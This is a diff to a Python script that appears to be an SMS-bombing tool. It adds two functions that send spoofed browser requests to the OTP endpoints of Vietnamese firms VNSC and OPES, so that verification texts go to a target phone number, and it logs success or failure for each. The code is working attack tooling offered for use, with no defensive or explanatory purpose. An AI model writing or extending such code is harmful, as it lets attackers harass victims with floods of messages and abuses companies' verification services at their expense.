@@ -4650,6 +4650,66 @@ def bds123():
     except requests.exceptions.RequestException:
         print("BDS123 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
+def vnsc():
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        'origin': 'https://invest.vnsc.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://invest.vnsc.vn/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'cross-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    json_data = {
+        'type': 'PHONE_VERIFICATION_OTP',
+        'phone': sdt,
+        'email': '',
+    }
+
+    try:
+        response = requests.post('https://api.vinasecurities.com/auth/v1/otp', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("VNSC | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("VNSC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def opes():
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'authorization': 'Bearer',
+        'o-chn': 'opes-website',
+        'o-client-id': 'c73894f9018617b8f00f741642e0dba3b53a2660ae1977b5efd1b65a99af67f3',
+        'o-gid': 'og.532b1985-a43e-4137-9fdb-0ca63dbd83a2',
+        'origin': 'https://opes.com.vn',
+        'priority': 'u=1, i',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    params = {
+        'userName': sdt,
+    }
+
+    try:
+        response = requests.get('https://website-api.opes.com.vn/api/auth/register-request-otp', params=params, headers=headers)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("OPES | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("OPES | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
 def hoasenhome():
     headers = {
         'Accept': 'application/json',
